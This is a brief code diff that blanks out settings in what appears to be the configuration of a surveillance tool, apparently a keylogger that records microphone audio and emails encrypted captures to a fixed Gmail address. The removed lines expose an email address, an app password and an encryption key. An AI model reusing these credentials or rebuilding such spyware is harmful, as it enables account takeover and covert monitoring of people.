@@ -46,13 +46,13 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "jasminejoyous7@gmail.com"
-password = "qfqkvpevlabedsyz" 
+email_address = ""
+password = "" 
 username = getpass.getuser()
 
 toaddr = "jasminejoyous7@gmail.com"
 
-key = "3roaV-EObm7Xh3HgXQSkqG02XuVjM5nRUY2cdF5pOx8="  # Generate an encryption key from the Cryptography folder
+key = ""  # Generate an encryption key from the Cryptography folder
 
 
 
